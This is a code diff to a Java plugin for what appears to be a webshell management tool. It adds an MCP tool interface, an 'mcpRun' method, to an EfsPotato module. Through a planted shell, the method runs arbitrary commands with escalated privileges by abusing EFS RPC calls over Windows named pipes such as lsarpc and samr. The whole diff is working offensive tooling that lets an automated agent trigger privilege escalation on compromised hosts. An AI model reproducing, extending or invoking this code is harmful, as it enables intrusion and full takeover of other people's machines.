@@ -28,6 +28,9 @@ import util.Log;
 import util.automaticBindClick;
 import util.functions;
 import util.http.ReqParameter;
+import core.annotation.McpTool;
+import core.annotation.McpParam;
+import java.util.Map;
 
 @PluginAnnotation(
     payloadName = "CSharpDynamicPayload",
@@ -140,6 +143,29 @@ public class EfsPotato extends ShellcodeLoader {
         reqParameter.add("exploitMethod", this.exploitMethodComboBox.getSelectedItem().toString());
         reqParameter.add("readWait", Integer.toString(readWait));
         return super.runShellcode(reqParameter, command, shellcode, readWait);
+    }
+
+    @McpTool(name = "run", desc = "EfsPotato 提权执行命令 (默认管道 lsarpc, 方法 EfsRpcOpenFileRaw)", params = {
+            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
+            @McpParam(name = "cmd", required = true, desc = "要执行的命令, 如: cmd /c whoami"),
+            @McpParam(name = "pipe", defaultValue = "lsarpc", desc = "lsarpc/efsrpc/samr/lsass/netlogon"),
+            @McpParam(name = "exploitMethod", defaultValue = "EfsRpcOpenFileRaw", desc = "EfsRpcOpenFileRaw/EfsRpcEncryptFileSrv") })
+    public String mcpRun(Map<String, Object> args) {
+        String cmd = String.valueOf(args.get("cmd"));
+        String pipe = String.valueOf(args.getOrDefault("pipe", "lsarpc"));
+        String method = String.valueOf(args.getOrDefault("exploitMethod", "EfsRpcOpenFileRaw"));
+        if (cmd == null || cmd.trim().isEmpty()) return "缺少参数: cmd";
+        if (!this.load()) return "插件加载失败 (EfsPotato.dll include 失败)";
+        try {
+            ReqParameter parameter = new ReqParameter();
+            parameter.add("pipe", pipe);
+            parameter.add("exploitMethod", method);
+            parameter.add("cmd", cmd);
+            byte[] result = this.payload.evalFunc("EfsPotato.EfsPotato", "run", parameter);
+            return this.encoding.Decoding(result);
+        } catch (Exception e) {
+            return "执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
+        }
     }
 
     public void init(ShellEntity shellEntity) {
